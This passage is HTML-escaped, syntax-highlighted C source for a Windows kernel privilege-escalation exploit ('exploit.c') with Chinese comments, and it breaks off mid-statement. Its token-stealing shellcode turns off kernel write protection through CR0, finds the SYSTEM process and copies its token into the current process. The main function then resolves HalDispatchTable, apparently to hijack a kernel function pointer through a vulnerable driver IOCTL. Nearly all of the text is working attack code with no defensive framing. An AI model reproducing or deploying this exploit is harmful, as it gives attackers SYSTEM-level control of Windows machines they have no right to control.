class=&quot;params&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN HANDLE Handle&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;)&lt;/span&gt;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;******************************** END *************************************&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;******************************** exploit.c *******************************&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;exploit.h&quot;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; IOCTL_CODE 0x8888A003&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;PVOID &lt;span class=&quot;title&quot;&gt;RtlAllocateMemory&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN ULONG Length)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    NTSTATUS NtStatus;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    PVOID BaseAddress = &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    NtStatus = NtAllocateVirtualMemory(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                       NtCurrentProcess(),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                       &amp;amp;BaseAddress,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                       &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                       &amp;amp;Length,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                       MEM_RESERVE |&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                       MEM_COMMIT,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                       PAGE_READWRITE);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(NtStatus == STATUS_SUCCESS)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        RtlZeroMemory(BaseAddress, Length);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return BaseAddress;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    return &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;VOID &lt;span class=&quot;title&quot;&gt;RtlFreeMemory&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IN PVOID BaseAddress)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    NTSTATUS NtStatus;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ULONG FreeSize = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    NtStatus = NtFreeVirtualMemory(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                   NtCurrentProcess(),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                   &amp;amp;BaseAddress,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                   &amp;amp;FreeSize,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                   MEM_RELEASE);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; g_ressdtOutputBuffer[&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;]=&amp;#123;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&amp;#125;;&lt;span class=&quot;comment&quot;&gt;//输出的缓冲区&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;DWORD g_uCr0=&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;NTSTATUS &lt;span class=&quot;title&quot;&gt;MyShellCode&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					 ULONG InformationClass,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					 ULONG BufferSize,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					 PVOID Buffer,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;					 PULONG ReturnedLength)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//关闭内核写保护&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	__asm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		cli&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		mov eax, cr0 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		mov g_uCr0,eax &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		and eax,&lt;span class=&quot;number&quot;&gt;0xFFFEFFFF&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		mov cr0, eax   &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//提权到SYSTEM&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	__asm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		mov eax,&lt;span class=&quot;number&quot;&gt;0xFFDFF124&lt;/span&gt;	&lt;span class=&quot;comment&quot;&gt;// eax = KPCR (not 3G Mode) &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		mov eax,[eax]		&lt;span class=&quot;comment&quot;&gt;//获取当前线程PETHREAD&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		mov esi,[eax+&lt;span class=&quot;number&quot;&gt;0x220&lt;/span&gt;] &lt;span class=&quot;comment&quot;&gt;//获取当前线程所属进程的PEPROCESS&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		mov eax,esi			&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;searchXp: &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		mov eax,[eax+&lt;span class=&quot;number&quot;&gt;0x88&lt;/span&gt;]  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		sub eax,&lt;span class=&quot;number&quot;&gt;0x88&lt;/span&gt;		&lt;span class=&quot;comment&quot;&gt;//获取进程链表中下一个进程的PEPROCESS&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		mov edx,[eax+&lt;span class=&quot;number&quot;&gt;0x84&lt;/span&gt;]  &lt;span class=&quot;comment&quot;&gt;//获取该进程的pid到edx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		cmp edx,&lt;span class=&quot;number&quot;&gt;0x4&lt;/span&gt;			&lt;span class=&quot;comment&quot;&gt;//通过PID查找SYSTEM进程 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		jne searchXp &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		mov eax,[eax+&lt;span class=&quot;number&quot;&gt;0xc8&lt;/span&gt;]	&lt;span class=&quot;comment&quot;&gt;//获取system进程的token &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		mov [esi+&lt;span class=&quot;number&quot;&gt;0xc8&lt;/span&gt;],eax	&lt;span class=&quot;comment&quot;&gt;//修改当前进程的token  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;//恢复内核写保护&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	_asm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		sti &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		mov eax, g_uCr0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		mov cr0, eax &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;	  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	return &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;ShowAlertMsg&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    LPVOID lpMsgBuf;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    DWORD dw = GetLastError(); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    FormatMessage(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        FORMAT_MESSAGE_ALLOCATE_BUFFER | &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        FORMAT_MESSAGE_FROM_SYSTEM,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        dw,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        (LPTSTR) &amp;amp;lpMsgBuf,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot;%s&quot;&lt;/span&gt;,lpMsgBuf);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    LocalFree(lpMsgBuf);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; __&lt;span class=&quot;function&quot;&gt;cdecl &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; argc, &lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; **argv)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    NTSTATUS NtStatus;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    HANDLE DeviceHandle;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ULONG ReturnLength = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; g_InputBuffer[&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;] =&lt;span class=&quot;string&quot;&gt;&quot;\x00\x00\x00\x00&quot;&lt;/span&gt;;	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ULONG ImageBase;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    PVOID MappedBase;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    UCHAR ImageName[KERNEL_NAME_LENGTH];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ULONG DllCharacteristics = DONT_RESOLVE_DLL_REFERENCES;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    PVOID HalDispatchTable;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    PVOID xHalQuerySystemInformation;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    PVOID MmUserProbeAddress;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ULONG ShellCodeSize = PAGE_SIZE;	&lt;span class=&quot;comment&quot;&gt;// 此值不可过高，否则可能导致在复制shellcode时引发异常，&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;										&lt;span class=&quot;comment&quot;&gt;// 因为复制的内存过广，可能有部分是不可写的，此时就会引发错误！&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    PVOID ShellCodeAddress;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    PVOID BaseAddress = &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    UNICODE_STRING DeviceName;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    UNICODE_STRING DllName;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ANSI_STRING ProcedureName;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    OBJECT_ATTRIBUTES ObjectAttributes;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    IO_STATUS_BLOCK IoStatusBlock;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    SYSTEM_MODULE_INFORMATION_EX *ModuleInformation = &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    LARGE_INTEGER Interval;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    ULONG TextColor;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;///////////////////////////////////////////////////////////////////////////////////////////////&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    system(&lt;span class=&quot;string&quot;&gt;&quot;cls&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;comment&quot;&gt;// 获取内核模块列表数据大小到ReturnLength&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    NtStatus = NtQuerySystemInformation(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        SystemModuleInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        ModuleInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        ReturnLength,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        &amp;amp;ReturnLength);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(NtStatus == STATUS_INFO_LENGTH_MISMATCH)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ReturnLength = (ReturnLength &amp;amp; &lt;span class=&quot;number&quot;&gt;0xFFFFF000&lt;/span&gt;) + PAGE_SIZE * &lt;span class=&quot;keyword&quot;&gt;sizeof&lt;/span&gt;(ULONG);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ModuleInformation = RtlAllocateMemory(ReturnLength);	&lt;span class=&quot;comment&quot;&gt;// 申请内存用于存放内核模块列表数据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(ModuleInformation)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;comment&quot;&gt;// 获取内核模块列表数据到ModuleInformation&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            NtStatus = NtQuerySystemInformation(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                SystemModuleInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                ModuleInformation,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                ReturnLength,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                NULL);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(NtStatus == STATUS_SUCCESS)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;comment&quot;&gt;// 从内核模块列表中获取内核第一个模块的基址和名称&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                ImageBase = (ULONG)(ModuleInformation-&amp;gt;Modules[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;].Base);	&lt;span class=&quot;comment&quot;&gt;// 获取模块基址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                RtlMoveMemory(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                              ImageName,	&lt;span class=&quot;comment&quot;&gt;// 获取模块名称&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                              (PVOID)(ModuleInformation-&amp;gt;Modules[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;].ImageName +&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                              ModuleInformation-&amp;gt;Modules[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;].ModuleNameOffset),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                              KERNEL_NAME_LENGTH);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot; **************************************************************************\n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                       &lt;span class=&quot;string&quot;&gt;&quot; * ImageBase - 0x%.8X                                                      \n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                       &lt;span class=&quot;string&quot;&gt;&quot; * ImageName - %s                                                    \n&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                       ImageBase,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                       ImageName);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                RtlFreeMemory(ModuleInformation);	&lt;span class=&quot;comment&quot;&gt;// 释放存放内核模块列表的内存&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                RtlCreateUnicodeStringFromAsciiz(&amp;amp;DllName, (PUCHAR)ImageName);	 &lt;span class=&quot;comment&quot;&gt;// 获取内核模块的UnicodeString&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;comment&quot;&gt;// 加载内核模块到本地进程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                NtStatus = LdrLoadDll(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                      NULL,                &lt;span class=&quot;comment&quot;&gt;// DllPath&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                      &amp;amp;DllCharacteristics, &lt;span class=&quot;comment&quot;&gt;// DllCharacteristics&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                      &amp;amp;DllName,            &lt;span class=&quot;comment&quot;&gt;// DllName&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                      &amp;amp;MappedBase);        &lt;span class=&quot;comment&quot;&gt;// DllHandle&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(	&lt;span class=&quot;string&quot;&gt;&quot; * \n&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;						&lt;span class=&quot;string&quot;&gt;&quot; * LdrLoadDLL:&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				ShowAlertMsg();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                RtlInitAnsiString(&amp;amp;ProcedureName, &lt;span class=&quot;string&quot;&gt;&quot;HalDispatchTable&quot;&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;comment&quot;&gt;// 获取内核HalDispatchTable 函数表地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                NtStatus = LdrGetProcedureAddress(&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                  (PVOID)MappedBase,          &lt;span class=&quot;comment&quot;&gt;// DllHandle&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                  &amp;amp;ProcedureName,             &lt;span class=&quot;comment&quot;&gt;// ProcedureName&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                  &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,                          &lt;span class=&quot;comment&quot;&gt;// ProcedureNumber OPTIONAL&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                                  (PVOID*)&amp;amp;HalDispatchTable); &lt;span class=&quot;comment&quot;&gt;// ProcedureAddress&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				&lt;span class=&quot;built_in&quot;&gt;printf&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&quot; * LdrGetProcedureAddress:&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;				ShowAlertMsg();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                (ULONG)HalDispatchTable -= 